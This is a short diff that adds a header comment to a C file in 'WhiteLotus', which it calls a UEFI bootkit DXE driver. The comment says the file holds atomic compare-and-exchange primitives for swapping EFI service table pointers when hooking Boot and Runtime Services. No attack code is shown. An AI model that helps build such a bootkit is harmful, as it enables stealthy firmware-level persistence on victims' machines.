@@ -1,3 +1,27 @@
+/*
+ * ============================================================
+ *  Project  : WhiteLotus — UEFI Bootkit DXE Driver
+ *  File     : Intern.c
+ * ============================================================
+ *
+ *  Description:
+ *    Implements atomic compare-and-exchange operations for
+ *    32-bit integers, 64-bit integers, and pointer-sized
+ *    values. These primitives are used to safely swap EFI
+ *    service table function pointers without race conditions
+ *    on multi-processor UEFI environments.
+ *
+ *  Purpose:
+ *    - Provide thread-safe pointer swapping required when
+ *      hooking EFI Boot Services and Runtime Services tables.
+ *
+ *  Author   : 0xbekoo
+ *  Blog     : https://0xbekoo.github.io
+ *  Updated  : 2026-05-21
+ *
+ * ============================================================
+ */
+
 #include "WhiteLotus.h"
 
 UINT32
